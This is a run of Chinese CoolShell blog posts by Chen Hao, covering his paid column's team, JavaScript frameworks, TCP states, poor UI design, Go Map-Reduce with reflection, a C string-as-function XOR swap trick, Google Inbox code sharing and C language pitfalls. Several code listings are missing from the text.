另外一方面，在整个过程中，我问他们，为什么你们要把这个事做得这么“重”？为什么不做得“轻”一点呢？还要录音频，音频对于技术型的文章里面有一堆坑啊，对于技术文章还有很多无法翻译的英文单词，在计算机的世界里，好多英文单词都是造出来的，音频师怎么读？(后来的确也是这样，我的音频师就把J2EE读成了“J二EE”)，他们的编辑也不知道怎么读，就上Youtube上找相关视频看老外是怎么发音的，然后标注好。而且，我的文章有时候写得太快，经常会有一些小错误，文字好改，但是还要改语音。对于这些，我都觉得好重啊，结果他们说，就是要做个“重的”，就是要做一个别人达不到的标杆，让竞争对手望而却步！
对于这两点，是让我很赞的。这样的做事精神和态度让我很佩服，是啊，在Amazon里也常说，要不断地提高标准。而且这让我深入思考了一下，一个事如果想要做好，做到极致，就算再简单的事，也会变成复杂， **这个世界上可能并不存在“轻模式”，只要你想做好，再“轻”的事都会变“重”** 。他们的这些做法，让我有了一种同道中人的感觉，人总是会向比自己强的人或是跟自己比较像的人靠近的。我感觉我在创业路上，就是要和这样的人在一起，面对再难的事，都要想尽一切办法解决之，面对再轻的事，都要花心思用重的模式去做好。而其它两个来找我做同样的事的公司，却没有让我看到他们有这样把事做成的不服输的决心和态度，真是形成了强烈的反差和对比。于是，我就这样“从”了！这里要点名一下极客邦的两个人——我叫他们作“双蕾”： **司巧蕾** 和 **郭蕾** 。（池大大也为极客时间付出了好多，因为大家都认识他了，我就弱化他一下了，嘿嘿）#### 这个专栏主要会写什么样的内容这是一个收费专栏，一旦收费了，我的压力也大了，因为你要写的内容就一定要能达到可以收费的价值了，不以再像个人博客一样，想写什么就什么。好在我从2003年开始我就在给好多企业做一些商业化的讲座和培训，也给一些公司做过一些商业的咨询和技术方案，包括在过去两年内帮助过一些公司打单。另外，在过去的10年内，我也在技术、职业和成长上帮助过很多年轻人。这些内容，我都没有完整或是具体地写在CoolShell中，所以，我觉得这些内容是可以放在这个收费专栏的。
此外，我在CoolShell上的文章都是不系统的，是碎片式的，还有一些只是知识，还不是认识。而我过去成长的20年，我的经验和知识已经在某些方面形成了比较完整的体系，而且有一些技术也能看到本质上的东西。所以，我觉得这些东西是可以呈现在这个专栏内的，都是非常有商业价值的，一定是可以帮助到大家的。当然，其中的一些东西，不是初级入门的程序员能够看懂的，需要有一定的工作经验和基础知识。而在我入行的这20年来，我觉得对于一个企业，一个团队，一个个体的程序员来说，有三件事是密不可分，也是相辅相成的，这三件事就是：技术、发展和管理。每个人，每个团队，每个企业，都需要认真地面对技术，不断地挑战新的技术，并且还要非常认真地发展个人和团队，而这些都需要对自我的管理或是对团队和公司的管理才能更高效的达成。所以，我的专栏会由这三部份构成:* **技术** 。对于技术方面，我不会写太多关于知识点的东西，因为这些知识点大家可以自行Google可以RTFM。我要写就一定是以体系化的，而且要能直达技术的本质。我入行这20年来，我最擅长的是针对各种大规模的系统，所以，我会有2-3个和分布式系统相关的系列文章，然后，我学过也用过好多编程语言，所以，我也会有一系列的关于编程本质的文章，而我对一些基础知识研究的也比较多，所以，还会有一系列的和基础知识相关的文章。当然，其中还会穿插一些其它的技术文章，比如一些热点事件，还有一些经验之谈，包括，我会把我的《程序员技术练级攻略》在这个专栏里重新再写一遍。这些东西一定会让大家有醍醐灌顶的感觉。
* **成长** 。在过去这20年中，我感觉得到，很多人都会非常在意自己的成长。所以，我会分享一堆我亲身经历的，也是我自己实验的一定和个人发展相关的文章。比如，像技术变现啊、如何面试、如何选择新的技术、如何学习、如何管理自己的时间、如何管理自己的老板和工作、如何成为一个Leader……这些东西一定会对大家有用。但是，我这里一定不会有速成的东西。一切都是要花时间和精力的。如果你想要速成，你不应该来订阅我的专栏。* **管理** 。这20年，我觉得做好技术工作，得做好技术的管理工作，只有管理好了软件工程和技术团队，技术才能发挥出最大的潜力。大多数的技术都是管理上的问题。所以，我会写上一系列的和管理相关的文章，管理三个要素，团队、项目和管理者自己。所以，我会从这三个方面写一系列包括，人员招聘、绩效考核、提升士气、解决冲突、面对变化、沟通说服、项目管理、任何排期、会议、远程管理……等等一系列的文章。这些东西都是我在外企时，接受到的世界顶级管理培训机构培训内容，我会把我的实践写出来分享给大家。这其中一定少不了亚马逊相关的各种实践。这些东西，我和很多公司和大佬都讲过，到目前为止还没有人不赞的。现在，我这个专栏写了快三个月了，第一部分和第二部分已经有一些呈现了。我周末和假期的时间也完全都搭进去了 ;-)。后面的文章还在和我的编辑一起在整理和书写中，我感觉这个专栏只收199一年简直是太便宜了，我有点想涨价的冲动了。哈哈。
#### 幕后团队最后说一下我的专栏编辑——她叫杨爽！以前是CSDN的程序员杂志的编辑，后来去了七牛，现在和我一起做我的这个专栏。她对我的这个专栏上的投入非常大，除了帮助我编辑文章，还要帮音频师标注语气，英文发音，以及音频版的文章，还要深度参与写作， **有的文章我只给了一个大纲，甚至只是一个方向，或是一系列的素材，然后都是她来操刀的，比如“推荐阅读”的文章、还有技术领导力的下篇，基本上是由杨爽来出第一版，然后我再上面再做修改和补充** 。她说，写技术文章真是太累了，尤其是帮你编辑你的分布式系列的文章，我基本都把这些技术都看了个大概了。我调侃到，如果你完全搞懂了，你就不用做编辑了，你可以做技术去了，嗯，而且，可以变成架构师了。另外，她会深度的编辑我的文章，尤其是每篇文章最后的一些总结或是一些问题都是她写的。在我的一篇答疑的文章中，她自己加入了一个观点——“很多事情能做到什么程度，其实在思想的源头就被决定了，因为它会绝大程度地受到思考问题出发点、思维方式、格局观、价值观等因素的影响”，这个观点被读者当成是我的观点，其实，这是杨爽的观点，当然我也很同意。所以，我的这个专栏离不开杨爽的付出，我和她一般都是在晚上或是周末沟通，因为平时我的时候都被创业的事给占据了。所以，她也只能适配我的时间，但她真的很努力，我能感觉得到她想把文章的质量不断提高的迫切。
关于专栏的音频师，他叫柴巍，是天津广播电台的主持人，一个89年的小伙子，网上他的个人信息在这里。他跨界来读这些技术文章的确对他来说非常不容易，因为一方面这文章里讲的这些东西他都看不懂，另外，他也不认识我，我脾气和性格他不知道，所以，他读我的文章里，并不能完全准确地把握相关的语气。这就需要杨爽来帮他标注和调整，有些地方，不断地修改，不断地录，大家知道，录音和写文章不一样，文章要修改很简单，语音要修改就非常麻烦，得把上下文全都一并重新再读一篇，这个过程的确难，杨爽在其中也花费了大量的时间和这个小伙子沟通和调整。在一开始，有播音腔，也被读者吐槽了，他自己后来一直在调整，目前越来越符合咱们的要求。这个小哥是非常努力和有挑战精神的，他在这个过程中，也是非常信守承诺的。去年12月6日，录分布式系统冰与火那篇文章时，他上午有自己的工作，下午要开会，晚上又有单位活动，他还是活动的主持人，他实在是没有时间了。我也和我的编辑说，算了，先发文章，后面再补音频。但是他还是挤时间把音频录出来了，期间，我还不知情地又修改了一下文章，他又配合修改，直到完全改好。打车去参加活动，还好提前20分钟赶到，没有耽误主持活动。
唠唠叨叨写这么多，也没什么干货！算是一份记录吧。也希望大家能够从我的专栏中看到这个团队的确是在用心做事的，是的，能认识这些人，还能一起合作，在我的人生经历上是非常有价值的事了。希望大家在新的一年里也能遇到这样的人。我们一起加油！图片来自：电影《速度与激情》——Ride or Die（全文完）# 十个开源的Javascript框架作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn下面是十个最牛的也是最流行的Javascript框架。它们完全可以担任目前世界上几乎所有一些和Ajax技术相关的和图形界面相关的一切功能。* ## jQuery如果今天你还不知道jQuery的话，那么作为一个程序员你可能真的是从火星来的了。这恐怕是Ajax中应用最广的框架。包括了许多很不错的UI组件，做出网页的效果也是令人称道的。不过，他最牛的是它的文件大小，只有区区18K，实在是居家旅行，网站开发之首选。下面是一个日历控件，很不错吧。* ## Prototype一个面向对象的javascript类库，包函了很多很多很实用的功能，很多其它的框架都使用了他作为基础类库。大小128K，有点大，还好。下面一其一个UI的示例。
* ## script.aculo.us这个框架是基础上面那个框架（Prototype ）上开发的，它被包含在Ruby on Rails框架中（）。* ## MooTools这是一个紧凑的，模块化的，面向对象风格的javascript框架，这并不是一个能直接用上的Javascript，他主要给程序员们方便地进行开发更高级的组件，因为这个框架主要是面对开发人员的，所以他是非常灵活和非常强大的。也不大，才63K。* ## ExtJS这是一个超级强大的Javascripts类库，简直是包罗万像，就像机器猫的口袋，想要什么就有什么。UI组件多的是令人发指，功能也是强大到不行。当然，其类库的尺寸也是强大到不行，一共6.6M，还是被压缩过的。看看下面的UI示例吧，这只不过是冰山一角。**我个人认为这个是所有框架里面最好的一个。*** ## QooxdooExjs才6.6M，这个javascript类库居然有19.9M，正所谓一山还有一山高，没有最BT，只有更BT。它包括一个独立于平台的开发工具链，一个最先进的图形用户界面工具和先进的客户端与服务器之间的通讯层。下面是其UI示例：* ## Yahoo! UI Library (YUI)
如果你不知道YUI的话，那么我想告诉你的是，你一定是在离地球20亿光年的亚美尼亚星居住。这个YUI类库也是包罗万象，他最好的不但是条件非常宽松的BSD的License，而且，你不必像别的类库一下，管你用不用你都要全部文件。YUI除了基础库外，你用多少就下载多少。这么丰富的UI也只有10.5M的大小，还OK了。下面是一个演示：* ## MochiKit一个很轻量级的类库，主要实际了异步请求的若干功能。* ## Midori又一个轻量级的类库，没有用过。只有45K大小。主要是一些UI上的美化吧。示例：* ## The Dojo Toolkit又一个超强大的类库，提供了非常丰富的UI。BSD的license，大小1.7M，看看下面的UI示例你就知道有多强大了。文章：来源# TCP网络关闭的状态变换时序图作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cnTCP共有11个网路状态，其中涉及到关闭的状态有5个。在我们编写网络相关程序的时候，这5个状态经常出现。因为这5个状态相互关联，相互纠缠，而且状态变化触发都是由应用触发，但是又涉及操作系统和网络，所以正确的理解TCP 在关闭时网络状态变化情况，为我们诊断网络中各种问题，快速定位故障有着非常重要的作用和意义。
下是是根据W.Richard Stevens的《TCP/IP详解》一书的TCP状态转换图。# UI的恶梦作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cnUI可能是编程中最令人头痛的事了。设计UI通常对于程序员来说是一件很痛苦的事情。下面，让我们来看一看一些可怕的UI设计吧，前面几个UI都是出于咱们程序员自己之手，把他们放在这里，希望能引起大家的注意。（国内软件的UI嘛的我就不说了，省得得罪人）下面这个例子不知道你是否让你似曾相识，呵呵，记得我上大学时，用delphi，PB经常开发这样的界面，当时觉得自己特牛！现在看上去嘛，简直就是一个垃圾。（关于UI设计，你可以查看本站的《35个强大的UI设计教程》）!UI的恶梦首先，我们先来看一个叫wGetGUI的小工具软件，这是一个100%由程序员设计的UI，如下所示：!wgetgui-screenshot看到这样的界面，你会觉得怎么样？“高科技”还是“头晕”？相比起命令行的那个wget，真不知道这个图形界面的工具是怎么被设计出来。哎。这里是这个工具的网页：，网页上还有几张图，也是一样的。不过，比起下面这个来，wGetGUI算不上什么了。下面这个软件叫做：FileMatrix，这个界面是前所未有的经典，那叫一个相当强大啊。估计可以节省很多对话框和tab页了，把软件的所有功能全部一次性陈列出来。这也是程序员的杰作。（点击图片，你可以慢慢欣赏下面这个UI的细节）
!UI当然，FileMatrix今天还在，其主页在这里。今天的FileMatrix的UI界面已经变得很简洁了，其还支持一些皮肤，不过它们还是很糟糕。如下所示：（更多的图片）!marble让我们再来看看历史上Windows 3.2的某个配色方案：hotdog（如下图所示），真不知道这是谁配的，真是——“红配黄，喜洋洋”啊。!windows-311-hotdog-stand-scheme不要以为，以简洁著称的Google就没有问题，最近的Google Wave大家用过没有？那个滚动条啊，我实在是没有搞懂为什么设计成那个样子。可谓史上最无厘头的滚动条了。下面，左边是Mac的，右边是Google Wave的，他们俩干的都是一样的事，但Google Wave的太令人摸不着头脑了。!google-wave-scrollbars对于Google Wave的滚动条，我只想说的是，根据《Don’t make me Think》的原则，这个滚动条和其它例子一样只站在了程序员的角度，而并没有考虑用户体验。下面这些文章，你都可以看看那大家的看法。1.    2.    3.    4.    5.你以Google wave scrollbar作为关键词到Google里搜索吧，你可以看到大量的讨论和抱怨。以至于Google自己都要写个说明了。
好了，最后两个图片和设计者无关，设计者在开始的时候可能并没有想到UI能变成这样。下面是关于IE7浏览器的，这张图你可能并不陌生，这是一张当我们的IE被安装了各种工具条后（很多是流氓软件）后的样子。（点击大图细细欣赏）!iemess2不要以为Firefox不会像IE一样，那是因为你的Firefox没有装插件，当安装上各种插件后，也是一样的。如下所示（点击图片，慢慢欣赏）。!ffToolbars最后，让我们看一个现实生活中的UI吧，好像是一个飞机驾驶舱。!Blackhawk-Cockpit你有什么UI恐怖的经历吗？欢迎与我们分享。# 5个不错的Flash的英文教程网作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn下面的这5个教程纯属个人观点，另外他们还都是免费的。* **MrSunStudios** – 这是一个非常不错的教程网站。里面有大量大量的关于ActionScript，PHP等等的教程。能教会你做很多很实用的东西。 * **AwestyProductions** – 虽然没怎么更新了，但他还是一个很不错的网站，其教你怎么去做一个小游戏。注意，其只是AS2的 * **Kirupa** – 虽然没有太多的教程，不过这是一个巨大的社区，只要你问问题，你可以很快得得到他们的帮助和答案。当你遇到你无法解决的问题时，这是相当相当的不错的去处。 * **Flash Explained** – 超过9页的非常不错的教程。 * **Flash Magazine – 并不只是一个杂志，其还有很多教程，那才是这个网站最重要的。**
# Go编程模式：Map-Reduce作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn在本篇文章中，我们学习一下函数式编程的中非常重要的Map、Reduce、Filter的三种操作，这三种操作可以让我们非常方便灵活地进行一些数据处理——我们的程序中大多数情况下都是在到倒腾数据，尤其对于一些需要统计的业务场景，Map/Reduce/Filter是非常通用的玩法。下面先来看几个例子：### 本文是全系列中第5 / 10篇：Go编程模式* Go编程模式：切片，接口，时间和性能   * Go 编程模式：错误处理   * Go 编程模式：Functional Options   * Go编程模式：委托和反转控制   * Go编程模式：Map-Reduce   * Go 编程模式：Go Generation   * Go编程模式：修饰器   * Go编程模式：Pipeline   * Go 编程模式：k8s Visitor 模式   * Go编程模式 ： 泛型编程« 上一篇文章下一篇文章 »目录* 基本示例     * Map示例     * Reduce 示例     * Filter示例   * 业务示例     * 员工信息     * 相关的Reduce/Fitler函数     * 各种自定义的统计示例   * 泛型Map-Reduce     * 简单版 Generic Map     * 健壮版的Generic Map     * 健壮版的 Generic Reduce     * 健壮版的 Generic Filter   * 后记
#### 基本示例##### Map示例下面的程序代码中，我们写了两个Map函数，这两个函数需要两个参数，* 一个是字符串数组 `[]string`，说明需要处理的数据一个字符串   * 另一个是一个函数`func(s string) string` 或 `func(s string) int`整个Map函数运行逻辑都很相似，函数体都是在遍历第一个参数的数组，然后，调用第二个参数的函数，然后把其值组合成另一个数组返回。于是我们就可以这样使用这两个函数：我们可以看到，我们给第一个 `MapStrToStr()` 传了函数做的是 转大写，于是出来的数组就成了全大写的，给`MapStrToInt()` 传的是算其长度，所以出来的数组是每个字符串的长度。我们再来看一下Reduce和Filter的函数是什么样的。##### **Reduce 示例**##### **Filter示例**下图是一个比喻，其非常形象地说明了Map-Reduce是的业务语义，其在数据处理中非常有用。#### 业务示例通过上面的一些示例，你可能有一些明白，Map/Reduce/Filter只是一种控制逻辑，真正的业务逻辑是在传给他们的数据和那个函数来定义的。是的，这是一个很经典的“业务逻辑”和“控制逻辑”分离解耦的编程模式。下面我们来看一个有业务意义的代码，来让大家强化理解一下什么叫“控制逻辑”与业务逻辑分离。
##### 员工信息首先，我们一个员工对象，以及一些数据type Employee struct {     Name     string     Age      int     Vacation int     Salary   int     }##### 相关的Reduce/Fitler函数然后，我们有如下的几个函数：简单说明一下：* `EmployeeConutIf` 和 `EmployeeSumIf` 分别用于统满足某个条件的个数或总数。它们都是Filter + Reduce的语义。   * `EmployeeFilterIn` 就是按某种条件过虑。就是Fitler的语义。##### 各种自定义的统计示例于是我们就可以有如下的代码。**1）统计有多少员工大于40岁****2）统计有多少员工薪水大于6000****3）列出有没有休假的员工****4）统计所有员工的薪资总和**fmt.Printf("Total Salary: %d\n", total_pay)     //Total Salary: 43500**5）统计30岁以下员工的薪资总和**#### 泛型Map-Reduce
我们可以看到，上面的Map-Reduce都因为要处理数据的类型不同而需要写出不同版本的Map- Reduce，虽然他们的代码看上去是很类似的。所以，这里就要带出来泛型编程了，Go语言在本文写作的时候还不支持泛型（注：Go开发团队技术负责人Russ Cox在2012年11月21golang-dev上的mail确认了Go泛型(type parameter)将在Go 1.18版本落地，即2022.2月份）。##### 简单版 Generic Map所以，目前的Go语言的泛型只能用 `interface{}` \+ `reflect`来完成，`interface{}` 可以理解为C中的 `void*`，Java中的 `Object` ，`reflect`是Go的反射机制包，用于在运行时检查类型。下面我们来看一下一个非常简单不作任何类型检查的泛型的Map函数怎么写。上面的代码中，* 通过 `reflect.ValueOf()` 来获得 `interface{}` 的值，其中一个是数据 `vdata`，另一个是函数 `vfn`，   * 然后通过 `vfn.Call()` 方法来调用函数，通过 `[]refelct.Value{vdata.Index(i)}`来获得数据。
Go语言中的反射的语法还是有点令人费解的，但是简单看一下手册还是能够读懂的。我这篇文章不讲反射，所以相关的基础知识还请大家自行Google相关的教程。于是，我们就可以有下面的代码——不同类型的数据可以使用相同逻辑的`Map()`代码。squared_arr := Map(nums,square)     fmt.Println(squared_arr)     //[1 4 9 16]但是因为反射是运行时的事，所以，如果类型什么出问题的话，就会有运行时的错误。比如：x := Map(5, 5)     fmt.Println(x)上面的代码可以很轻松的编译通过，但是在运行时就出问题了，还是panic错误……panic: reflect: call of reflect.Value.Len on int Valuegoroutine 1 [running]:     reflect.Value.Len(0x10b5240, 0x10eeb58, 0x82, 0x10716bc)     /usr/local/Cellar/go/1.15.3/libexec/src/reflect/value.go:1162 +0x185     main.Map(0x10b5240, 0x10eeb58, 0x10b5240, 0x10eeb60, 0x1, 0x14, 0x0)     /Users/chenhao/.../map.go:12 +0x16b     main.main()     /Users/chenhao/.../map.go:42 +0x465     exit status 2
##### 健壮版的Generic Map所以，如果要写一个健壮的程序，对于这种用`interface{}` 的“过度泛型”，就需要我们自己来做类型检查。下面是一个有类型检查的Map代码：}上面的代码一下子就复杂起来了，可见，复杂的代码都是在处理异常的地方。我不打算Walk through 所有的代码，别看代码多，但是还是可以读懂的，下面列几个代码中的要点：* 代码中没有使用Map函数，因为和数据结构和关键有含义冲突的问题，所以使用`Transform`，这个来源于 C++ STL库中的命名。   * 有两个版本的函数，一个是返回一个全新的数组 – `Transform()`，一个是“就地完成” – `TransformInPlace()`   * 在主函数中，用 `Kind()` 方法检查了数据类型是不是 Slice，函数类型是不是Func   * 检查函数的参数和返回类型是通过 `verifyFuncSignature()` 来完成的，其中：      * `NumIn()` – 用来检查函数的“入参”     * `NumOut()` 用来检查函数的“返回值”   * 如果需要新生成一个Slice，会使用 `reflect.MakeSlice()` 来完成。
好了，有了上面的这段代码，我们的代码就很可以很开心的使用了：可以用于字符串数组可以用于整形数组可以用于结构体##### 健壮版的 Generic Reduce同样，泛型版的 Reduce 代码如下：var ins [2]reflect.Value     ins[0] = sliceInType.Index(0)     ins[1] = sliceInType.Index(1)     out := fn.Call(ins[:])[0]##### 健壮版的 Generic Filter同样，泛型版的 Filter 代码如下（同样分是否“就地计算”的两个版本）：var boolType = reflect.ValueOf(true).Type()out := sliceInTypereturn out.Interface(), len(which)     }#### 后记还有几个未尽事宜：1）使用反射来做这些东西，会有一个问题， **那就是代码的性能会很差。所以，上面的代码不能用于你需要高性能的地方** 。怎么解决这个问题，我们会在本系列文章的下一篇文章中讨论。2）上面的代码大量的参考了 Rob Pike的版本，他的代码在
3）其实，在全世界范围内，有大量的程序员都在问Go语言官方什么时候在标准库中支持 Map/Reduce，Rob Pike说，这种东西难写吗？还要我们官方来帮你们写么？这种代码我多少年前就写过了，但是，我从来一次都没有用过，我还是喜欢用“For循环”，我觉得你最好也跟我一起用 “For循环”。我个人觉得，Map/Reduce在数据处理的时候还是很有用的，Rob Pike可能平时也不怎么写“业务逻辑”的代码，所以，对他来说可能也不太了解业务的变化有多么的频繁……当然，好还是不好，由你来判断，但多学一些编程模式是对自己的帮助也是很有帮助的。（全文完）# C语言函数实现的另类方法作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn在前面看过那个BT的Javascript程序后，我们来看一个C语言的，相信大家还记得输出从1到1000的数最后的那个示例，本站还有很多这样的示例，如：变态的hello word，如何教新手编程，还有恐怖的C++，在下面这个示例面前，神马都是浮云。下面这个示例向你展示了如何写一个swap()函数（把两个值交换），这段代码在我的Linux下的 gcc v4.1.1下可以正确编译通过，连一个Warning都没有，而且可以正确工作。我能说什么？！C语言并不疯狂，疯狂的是程序员。
printf("%d %d\n",a,b);     }其实，这种 **用字符串来实现函数的方法** ，在原理上是很好理解的。字符串就是一段内存空间，把一个字符串指针强转成函数指针，那么这个指针所指向的内容就是各种指令，因此，那堆乱七八糟的东西说白了就是汇编。8086的汇编。你可以使用ndisasm来看看。# ruby -e "print \"\x8b\x44\x24\x04\x8b\x5c\x24\x08\x8b\x00\x8b\x1b\x31\xc3\x31\xd8\x31\xc3\x8b\x4c\x24\x04\x89\x01\x8b\x4c\x24\x08\x89\x19\xc3\"" | ndisasm -u -00000000  8B442404          mov eax,[esp+0x4]       ; load pointers to two parameters into eax, ebx     00000004  8B5C2408          mov ebx,[esp+0x8]00000008  8B00              mov eax,[eax]           ; load values of two parameters from pointers (*eax, *ebx) into eax, ebx     0000000A  8B1B              mov ebx,[ebx]
0000000C  31C3              xor ebx,eax             ; swap two values (eax, ebx) using xor trick     0000000E  31D8              xor eax,ebx     00000010  31C3              xor ebx,eax00000012  8B4C2404          mov ecx,[esp+0x4]       ; load pointer to param 1 into ecx     00000016  8901              mov [ecx],eax           ; store swapped value 1 (eax) into param 1 (*ecx)00000018  8B4C2408          mov ecx,[esp+0x8]       ; load pointer to param 2 into ecx     0000001C  8919              mov [ecx],ebx           ; store swapped value 2 (ebx) into param 2 (*ecx)
0000001E  C3                ret注意：这段汇编中使用了XOR而不是引入第三个变量来完成了变量值的交换。关于XOR的方式，参看下面的示例：a = a^b;     b=a^b;     a=b^a;或者更为简单的：`a^=b^=a^=b;`(全文完)# Google Inbox如何跨平台重用代码？作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn原文链接《How Google Inbox shares 70% of its code across Android, iOS, and the Web》!inbox2-640x264开发一个移动应用在当下并不是一件容易的事情。如果想要获得最多的用户，你的应用通常需要覆盖 iOS, Android, 和 Web 三大平台。这就意味着同一个应用需要开发三个版本，使用 Objective-C 或者 Swift 开发 iOS 版本，使用 Java 开发 Android 版本，使用 JavaScript/CSS/HTML5 开发 Web 版本。工作量增大的同时也意味着有更多的 bug 需要修复。
这个问题也是 Google 在开发 Google Inbox 时致力要解决的。在最近发布的这款应用中，Google 使用了一些工具实现了70%的代码跨平台复用。Google Inbox 覆盖 iOS, Android, Web 三个平台，它们使用的是同一个后台代码逻辑，只是前端的用户体验和平台相关特性的实现有所不同。Google 自主开发了一套辅助工具将 Android 版本的 Java 代码逻辑编译为 Objective-C (针对 iOS 平台) 和 JavaScript (针对 Web 浏览器)。 Java 到 JavaScript 的编译由 Google Web Toolkit SDK 完成，Java 到 Objective-C 的编译则由 J2ObjC （j2objc.org）来完成。J2ObjC 是一个开源项目，由 Google 在2013年发布。Google Sheets (Google Docs 中的电子表格部分) 也使用了 J2ObjC，而 Google Inbox 则是目前使用 J2Objc 最多的 Google 项目。Google Inbox 复用的代码逻辑包括：对话 (conversations)，提醒 (reminders)，联系人 (contacts)。还有网络相关功能和离线同步。这些代码逻辑的复用节省了大量的时间和成本。
在产品设计时，Google 将这些可复用功能划分为抽象的逻辑概念，比如：提醒的逻辑放在 “reminder.java” 中，可以被 Android UI 调用。对 iOS 版本而言，J2ObjC 将 “reminder.java” 编译成 Objective-C 代码，再由 iOS UI 调用。Google 没有跨平台编译 UI 部分的代码，因为不同平台的UI特性各有不同，盲目统一会导致非常糟糕的用户体验。代码复用只是针对可以共享的后台逻辑，前端的UI实现是完全原生 (native) 的。这与 Xamarin (一个基于 Microsoft C# 的跨平台移动开发工具) 提出的概念类似。跨平台代码复用通常会带来一些性能上的问题。Garrick Toubassi，Engineering Director 和 Google Inbox 项目组成员，对此表示： “性能上的影响如果有的话，也可以说是微不足道的。我们做过大量的性能测试。因为没有加入额外的中间层来处理跨平台兼容性，所有代码最后都是平台原生代码。J2ObjC 编译生成的目标代码和 Java 源代码拥有大致相同的对象数量和对象图谱复杂度 (object graph complexity) ”。
Google 使用的整套方法解决了跨平台移动开发中的一个很重要的问题，同时也推进了安卓先行 (Android-first) 的移动开发策略。更多 Google Inbox 文章请猛戳 Gmail 官方博客。*[W3C]: World Wide Web Consortium   *[VML]: Vector Markup Language# 深入理解C语言作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cnDennis Ritchie 过世了，他发明了C语言，一个影响深远并彻底改变世界的计算机语言。一门经历40多年的到今天还长盛不衰的语言，今天很多语言都受到C的影响，C++，Java，C#，Perl， PHP， Javascript， 等等。但是，你对C了解吗？相信你看过本站的《C语言的谜题》还有《谁说C语言很简单？》，这里，我再写一篇关于深入理解C语言的文章，一方面是缅怀Dennis，另一方面是告诉大家应该如何学好一门语言。（顺便注明一下，下面的一些例子来源于这个slides）首先，我们先来看下面这个经典的代码：int main()     {     int a = 42;     printf(“%d\n”, a);     }
不过，让我们来深入的学习一下，* 这段代码在C++下无法编译，因为C++需要明确声明函数   * 这段代码在C的编译器下会编译通过，因为在编译期，编译器会生成一个printf的函数定义，并生成.o文件，链接时，会找到标准的链接库，所以能编译通过。   * 但是，你知道这段程序的退出码吗？在ANSI-C下，退出码是一些未定义的垃圾数。但在C89下，退出码是3，因为其取了printf的返回值。为什么printf函数返回3呢？因为其输出了’4′, ‘2’,’\n’ 三个字符。而在C99下，其会返回0，也就是成功地运行了这段程序。你可以使用gcc的 -std=c89或是-std=c99来编译上面的程序看结果。   * 另外，我们还要注意main()，在C标准下，如果一个函数不要参数，应该声明成main(void)，而main()其实相当于main(…)，也就是说其可以有任意多的参数。我们再来看一段代码：这个程序会输出什么？* 我相信你对a的输出相当有把握，就分别是4，5，6，因为那个静态变量。   * 对于c呢，你应该也比较肯定，那是一堆乱数。   * 但是你可能不知道b的输出会是什么？答案是1，2，3。为什么和c不一样呢？因为，如果要初始化，每次调用函数里，编译器都要初始化函数栈空间，这太费性能了。但是c的编译器会初始化静态变量为0，因为这只是在启动程序时的动作。   * 全局变量同样会被初始化。
说到全局变量，你知道 静态全局变量和一般全局变量的差别吗？是的，对于static 的全局变量，其对链接器不可以见，也就是说，这个变量只能在当前文件中使用。我们再来看一个例子：你知道这段代码会输出什么吗？A) 一个随机值，B) 42。A 和 B都对（在“在函数外存取局部变量的一个比喻”文中的最后给过这个例子），不过，你知道为什么吗？* 如果你使用一般的编译，会输出42，因为我们的编译器优化了函数的调用栈（重用了之前的栈），为的是更快，这没有什么副作用。反正你不初始化，他就是随机值，既然是随机值，什么都无所谓。   * 但是，如果你的编译打开了代码优化的开关，-O，这意味着，foo()函数的代码会被优化成main()里的一个inline函数，也就是说没有函数调用，就像宏定义一样。于是你会看到一个随机的垃圾数。下面，我们再来看一个示例：这段程序会输出什么？，你会说是，3，4，7。但是我想告诉你，这也有可能输出，4，3，7。为什么呢？ 这是因为，在C/C++中，表达的评估次序是没有标准定义的。编译器可以正着来，也可以反着来，所以，不同的编译器会有不同的输出。你知道这个特性以后，你就知道这样的程序是没有可移植性的。
我们再来看看下面的这堆代码，他们分别输出什么呢？`int a=41; a++; printf("%d\n", a);`   `int a=41; a++ & printf("%d\n", a);`   `int a=41; a++ && printf("%d\n", a);`   `int a=41; if (a++ < 42) printf("%d\n", a);`   `int a=41; a = a++; printf("%d\n", a);`只有示例一，示例三，示例四输出42，而示例二和五的行为则是未定义的。关于这种未定义的东西是因为Sequence Points的影响（Sequence Points是一种规则，也就是程序执行的序列点，在两点之间的表达式只能对变量有一次修改），因为这会让编译器不知道在一个表达式顺列上如何存取变量的值。比如a = a++，a + a++，不过，在C中，这样的情况很少。下面，再看一段代码：（假设int为4字节，char为1字节）这个代码会输出什么?a) 9，10   b)12, 12   c)12, 16答案是C，我想，你一定知道字节对齐，是向4的倍数对齐。
* 但是，你知道为什么要字节对齐吗？还是因为性能。因为这些东西都在内存里，如果不对齐的话，我们的编译器就要向内存一个字节一个字节的取，这样一来，struct X，就需要取9次，太浪费性能了，而如果我一次取4个字节，那么我三次就搞定了。所以，这是为了性能的原因。   * 但是，为什么struct Y不向12 对齐，却要向16对齐，因为char d; 被加在了最后，当编译器计算一个结构体的尺寸时，是边计算，边对齐的。也就是说，编译器先看到了int，很好，4字节，然后是 char，一个字节，而后面的int又不能填上还剩的3个字节，不爽，把char b对齐成4，于是计算到d时，就是13 个字节，于是就是16啦。但是如果换一下d和c的声明位置，就是12了。另外，再提一下，上述程序的printf中的%d并不好，因为，在64位下，sizeof的size_t是unsigned long，而32位下是 unsigned int，所以，C99引入了一个专门给size_t用的%zu。这点需要注意。在64位平台下，C/C++ 的编译需要注意很多事。你可以参看《64位平台C/C++开发注意事项》。下面，我们再说说编译器的Warning，请看代码：
